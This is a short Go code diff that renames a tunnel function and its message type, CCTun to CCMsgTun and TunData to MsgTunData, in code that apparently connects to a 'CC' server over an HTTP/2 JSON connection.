@@ -97,12 +97,12 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	return
 }
 
-// CCTun use the connection (CCConn)
-func CCTun(ctx context.Context, cancel context.CancelFunc) (err error) {
+// CCMsgTun use the connection (CCConn)
+func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
 		in  = json.NewDecoder(H2Json)
 		out = json.NewEncoder(H2Json)
-		msg TunData // data being exchanged in the tunnel
+		msg MsgTunData // data being exchanged in the tunnel
 	)
 	go catchInterruptAndExit(cancel)
 	defer func() {
